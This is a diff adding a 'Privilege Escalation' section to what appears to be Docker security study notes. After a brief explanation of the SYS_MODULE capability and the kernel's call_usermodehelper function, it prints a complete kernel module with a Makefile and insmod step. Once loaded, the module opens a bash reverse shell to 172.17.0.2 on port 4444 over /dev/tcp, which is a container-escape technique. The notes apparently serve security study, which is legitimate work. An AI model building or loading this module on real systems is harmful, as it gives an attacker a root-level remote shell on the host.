@@ -441,3 +441,51 @@
 - Shifting Docker security left: <https://snyk.io/blog/shifting-docker-security-left/>
 - At DockerCon: "Building a Docker Image Packaging Pipeline Using GitHub Actions": https://docker.events.cube365.net/docker/dockercon/content/Videos/SPWM3BdnCZWPN4fN9
 - At DockerCon: "Your Container Has Vulnerabilities. Now What?" https://docker.events.cube365.net/docker/dockercon/content/Videos/GZpzJAapdrSXohzNz
+
+## Privilege Escalation
+
+- ​Capabilities: `capsh --print`
+  - `SYS_MODULE` capability
+    - `​ip addr`
+    - The call_usermodehelper function is used to create user mode processes from kernel space.
+    - The call_usermodehelper function takes three parameters: argv, envp and UMH_WAIT_EXEC
+      - The arguments to the program are stored in argv.
+      - The environment variables are stored in envp.
+      - UMH_WAIT_EXEC causes the kernel module to wait till the loader executes the program.
+    - Reference
+      - <https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html>
+      - Invoking user-space applications from the kernel: <https://developer.ibm.com/articles/l-user-space-apps/>
+      - Usermode Helper API: <https://insujang.github.io/2017-05-10/usermode-helper-api/>
+    ```c
+    // reverse-shell.c
+    #include <linux/kmod.h> 
+    #include <linux/module.h>
+
+    MODULE_LICENSE("GPL"); 
+    MODULE_AUTHOR("AttackDefense"); 
+    MODULE_DESCRIPTION("LKM reverse shell module"); 
+    MODULE_VERSION("1.0");
+
+    char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.2/4444 0>&1", NULL};
+    static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL }; 
+
+    static int __init reverse_shell_init(void) {
+        return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    }
+
+    static void __exit reverse_shell_exit(void) {
+        printk(KERN_INFO "Exiting\n");
+    }
+
+    module_init(reverse_shell_init); module_exit(reverse_shell_exit);
+    ```
+    ```Makefile
+    # Makefile
+    #   make
+    # ​  insmod reverse-shell.ko
+    obj-m +=reverse-shell.o
+    all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+    clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+    ```
